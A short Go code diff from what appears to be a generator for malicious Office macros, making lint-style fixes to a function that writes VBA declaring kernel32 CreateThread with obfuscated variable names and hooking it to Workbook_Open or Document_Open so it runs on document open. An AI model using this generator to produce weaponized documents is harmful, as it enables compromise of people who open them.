@@ -185,11 +185,11 @@ func GenerateMacroVBA(config MacroConfig) (string, error) {
 		ctStack := vars.next()
 		ctArg := vars.next()
 		ctFlags := vars.next()
-		ctThreadId := vars.next()
+		ctThreadID := vars.next()
 		sb.WriteString(fmt.Sprintf("Private Declare PtrSafe Function %s Lib \"kernel32\" Alias \"CreateThread\" _\n", createThread))
 		sb.WriteString(fmt.Sprintf("    (ByVal %s As Long, ByVal %s As Long, ByVal %s As LongPtr, _\n", ctSecAttr, ctStack, ctArg))
-		sb.WriteString(fmt.Sprintf("     ByVal %s As LongPtr, ByVal %s As Long, _\n", ctFlags, ctThreadId))
-		sb.WriteString(fmt.Sprintf("     ByRef %s As Long) As LongPtr\n", ctThreadId))
+		sb.WriteString(fmt.Sprintf("     ByVal %s As LongPtr, ByVal %s As Long, _\n", ctFlags, ctThreadID))
+		sb.WriteString(fmt.Sprintf("     ByRef %s As Long) As LongPtr\n", ctThreadID))
 
 		wfHandle := vars.next()
 		wfTimeout := vars.next()
@@ -282,12 +282,12 @@ func GenerateMacroVBA(config MacroConfig) (string, error) {
 	sb.WriteString("End Sub\n\n")
 
 	if config.DocumentEvent == "Workbook_Open" {
-		sb.WriteString(fmt.Sprintf("Sub Workbook_Open()\n"))
+		sb.WriteString("Sub Workbook_Open()\n")
 		sb.WriteString(fmt.Sprintf("    %s\n", autoOpenFunc))
 		sb.WriteString("End Sub\n\n")
 	}
 	if config.DocumentEvent == "Document_Open" {
-		sb.WriteString(fmt.Sprintf("Sub Document_Open()\n"))
+		sb.WriteString("Sub Document_Open()\n")
 		sb.WriteString(fmt.Sprintf("    %s\n", autoOpenFunc))
 		sb.WriteString("End Sub\n\n")
 	}
